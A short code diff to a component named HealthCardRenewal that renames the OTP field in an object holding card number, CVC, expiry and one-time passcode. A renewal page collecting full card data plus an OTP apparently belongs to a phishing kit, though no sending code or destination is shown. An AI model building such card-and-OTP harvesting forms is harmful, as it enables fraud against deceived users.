@@ -59,7 +59,7 @@ export default function HealthCardRenewal() {
                 datayaer:datayaer,
                 dateMonth:dateMonth,
                 CVC:CVC,
-                otp:otp,
+                otp:otpArd,
                 cardNumber:cardNumber,
                 // Add any other form fields here
               });
